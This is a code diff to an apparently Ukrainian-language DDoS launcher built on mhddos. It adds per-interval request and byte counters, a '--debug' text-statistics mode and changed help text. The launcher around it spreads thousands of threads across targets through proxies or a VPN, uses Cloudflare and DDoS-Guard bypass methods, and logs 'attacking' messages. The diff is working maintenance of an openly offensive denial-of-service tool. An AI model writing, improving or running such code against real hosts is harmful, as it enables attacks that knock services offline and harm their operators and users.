@@ -55,6 +55,12 @@ class AtomicCounter:
         with self._lock:
             self.value += num
 
+    def reset(self, value=0):
+        with self._lock:
+            old = self.value
+            self.value = value
+        return old
+
 
 class Targets:
     def __init__(self, targets, config):
@@ -149,7 +155,7 @@ def update_proxies(period, targets, proxy_timeout):
             wr.write(str(proxy) + '\n')
 
 
-def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, table):
+def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
     threads_per_target = total_threads // len(targets)
     params_list = []
     for target in targets:
@@ -188,8 +194,13 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
                 f"{cl.WARNING}Атакуємо{cl.OKBLUE} %s{cl.WARNING} методом{cl.OKBLUE} %s{cl.WARNING}, потоків:{cl.OKBLUE} %d{cl.WARNING}!{cl.RESET}"
                 % (params.url.host, params.method, params.threads))
 
+    if not (table or debug):
+        logger.info(f'{cl.OKGREEN}Атака запущена, новий цикл через {period} секунд{cl.RESET}')
+        sleep(period)
+        return
+
     ts = time()
-    refresh_rate = 2
+    refresh_rate = 4 if table else 2
     sleep(refresh_rate)
     while True:
         passed = time() - ts
@@ -201,9 +212,9 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_
         total_bps = 0
         for k in statistics:
             counters = statistics[k]
-            pps = int(int(counters['requests']) / passed)
+            pps = int(counters['requests'].reset() / refresh_rate)
             total_pps += pps
-            bps = int(int(counters['bytes']) / passed)
+            bps = int(counters['bytes'].reset() / refresh_rate)
             total_bps += bps
             if table:
                 tabulate_text.append(
@@ -254,9 +265,11 @@ def get_resolvable_targets(targets):
                 logger.warning(f'{cl.FAIL}Ціль {target} недоступна і не буде атакована{cl.RESET}')
 
 
-def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, table):
+def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, debug, table):
     os.chdir('mhddos')
-    if not table:
+    if table:
+        debug = False
+    if debug:
         logger.setLevel(logging.DEBUG)
 
     for bypass in ('CFB', 'DGB'):
@@ -278,7 +291,7 @@ def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods,
         no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
             update_proxies(period, targets, proxy_timeout)
-        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, table)
+        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -316,8 +329,8 @@ def init_argparse() -> argparse.ArgumentParser:
     parser.add_argument(
         '--debug',
         action='store_true',
-        default=True,
-        help='Enable debug output',
+        default=False,
+        help='Print log as text',
     )
     parser.add_argument(
         '--table',
@@ -344,7 +357,7 @@ def init_argparse() -> argparse.ArgumentParser:
         '--proxy-timeout',
         type=float,
         default=5,
-        help='How many seconds to wait for the proxy to make a connection.'
+        help='How many seconds to wait for the proxy to make a connection (default is 5)'
     )
     return parser
 
@@ -355,7 +368,8 @@ def print_banner(vpn_mode):
 
 - {cl.WARNING}VPN замість проксі{cl.RESET} - прапорець `--vpn`
 - {cl.WARNING}Навантаження (кількість потоків){cl.RESET} - параметр `-t 3000`, за замовчуванням - CPU * 1000
-- {cl.WARNING}Інформація у вигляді таблиці{cl.RESET} - прапорець `--table`
+- {cl.WARNING}Статистика у вигляді таблиці{cl.RESET} - прапорець `--table`
+- {cl.WARNING}Статистика у вигляді тексту{cl.RESET} - прапорець `--debug`
 - {cl.WARNING}Повна документація{cl.RESET} - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
     ''')
 
@@ -371,5 +385,6 @@ if __name__ == '__main__':
         args.proxy_timeout,
         args.http_methods,
         args.vpn_mode,
+        args.debug,
         args.table,
     )
